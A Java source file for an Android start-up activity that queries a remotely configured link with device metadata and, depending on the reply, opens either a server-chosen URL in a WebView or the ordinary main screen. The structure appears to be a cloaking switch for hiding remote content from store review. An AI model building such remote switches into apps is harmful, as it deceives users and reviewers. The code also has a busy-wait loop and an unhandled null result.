package com.template;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.webkit.WebView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.FirebaseApp;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.Charset;
import java.util.TimeZone;
import java.util.UUID;
import java.util.concurrent.ExecutionException;

public class MyInitialActivity extends AppCompatActivity {

    String uuid;
    FirebaseRemoteConfig firebaseRemoteConfig;
    private static final String ONESIGNAL_APP_ID = "f9db4054-450c-4628-ab97-f6680d1e9d0d";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        //FireBase init

        FirebaseApp.initializeApp(this);
        firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings firebaseRemoteConfigSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(10)
                .build();
        firebaseRemoteConfig.setConfigSettingsAsync(firebaseRemoteConfigSettings);

        firebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
            @Override
            public void onComplete(@NonNull Task<Boolean> task) {
                if(task.isSuccessful()){
                cont();}else{cont();}
            }
        });

    }
    private void cont(){
            Log.d("Firebases", "continue");


            //OneSignal API init
            OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
            OneSignal.initWithContext(this);
            OneSignal.setAppId(ONESIGNAL_APP_ID);

            uuid = OneSignal.getDeviceState().getUserId();
            Log.d("uuidd",uuid+"");
            if(uuid == null) {
                try {
                    firstInit();
                } catch (IOException | ExecutionException | InterruptedException | JSONException e) {
                    e.printStackTrace();
                }
                return;
            }
            AsyncGetTags agt = new AsyncGetTags();
            agt.start();
            while(agt.getStatus()){}
            String tag = agt.getResult();

            if(tag.equals("Error")){
                openMain();
                return;
            }
            openWeb(tag);
        }


    private void firstInit() throws IOException, ExecutionException, InterruptedException, JSONException {
        //params for url
        uuid = UUID.randomUUID().toString();
        OneSignal.setExternalUserId(uuid);
        String checkLink = firebaseRemoteConfig.getString("check_link");
        if(checkLink.isEmpty()){
            failInit();
            return;
        }
        Log.d("Check_link", checkLink+"");
        String packID = this.getPackageName();
        TimeZone tz = TimeZone.getDefault();
        Log.d("Timezone",tz.getID());
        String tail = "&getr=utm_source=google-play&utm_medium=organic";
        String url = checkLink+"/?packageid="+packID+"&usserid="+uuid+"&getz="+tz.getID()+tail;
        String userAgent = new WebView(this).getSettings().getUserAgentString();

        //Async
        AsyncReq ar = new AsyncReq();
        ar.execute(url,userAgent);
        String response = ar.get();
        Log.d("response",response);
        if(response.equals("error")){
            failInit();
        }else{
            successInit(response);
        }


    }


    private void successInit(String url) {

        Log.d("InitProg","success");
        OneSignal.sendTag("PRIMER_URL",url);
        openWeb(url);

    }
    private void failInit(){
        Log.d("InitProg","fail");
        OneSignal.sendTag("PRIMER_URL","Error");
        openMain();
    }

    private void openMain(){
        Intent intent = new Intent();
        intent.setClass(this, MainActivity.class);
        startActivity(intent);
        finish();
    }

    private void openWeb(String url){
        Intent intent = new Intent();
        intent.putExtra("url",url);
        intent.setClass(this, WebActivity.class);
        startActivity(intent);
        finish();
    }


}

class AsyncReq extends AsyncTask<String, Integer, String> {

    @Override
    protected String doInBackground(String... strings) {
        Log.d("FirebasesSend",strings[0]);
        int statusCode = 403;
        try{
            URL url = new URL(strings[0]);
            HttpURLConnection http = (HttpURLConnection)url.openConnection();
            //http.addRequestProperty("User-Agent",strings[1]);
            statusCode = http.getResponseCode();
            if(statusCode == 200){
                InputStream is = http.getInputStream();
                BufferedReader rd = new BufferedReader(new InputStreamReader(is, Charset.forName("UTF-8")));
                String jsonText = readAll(rd);
                JSONObject json = new JSONObject(jsonText);
                String resp = json.getString("url");
                Log.d("Tages",resp+"\n"+jsonText);
                return resp;
            }
            http.disconnect();
        } catch (IOException | JSONException e) {
            e.printStackTrace();
        }
        Log.d("Tages","Error");
        return "error";
    }
    private static String readAll(Reader rd) throws IOException {
        StringBuilder sb = new StringBuilder();
        int cp;
        while ((cp = rd.read()) != -1) {
            sb.append((char) cp);
        }
        return sb.toString();
    }
}

class AsyncGetTags extends Thread{

    private String result=null;
    private boolean status=true;

    @Override
    public void run() {
        OneSignal.getTags(new OneSignal.OSGetTagsHandler() {
            @Override
            public void tagsAvailable(JSONObject tags) {
                //tags can be null
                if (tags != null) {
                    setResult(tags);
                }else{
                    setResult(null);
                }
            }
        });
    }

    public boolean getStatus(){
        return this.status;
    }

    private void setResult(JSONObject result){
        if(result != null)
        try{
            this.result = result.getString("PRIMER_URL");
            Log.d("ThResultset", this.result+"1");
        } catch (JSONException e) {
        }
        status = false;
    }

    public String getResult(){
        Log.d("ThResultset", this.result+"2");
        return this.result;
    }

}

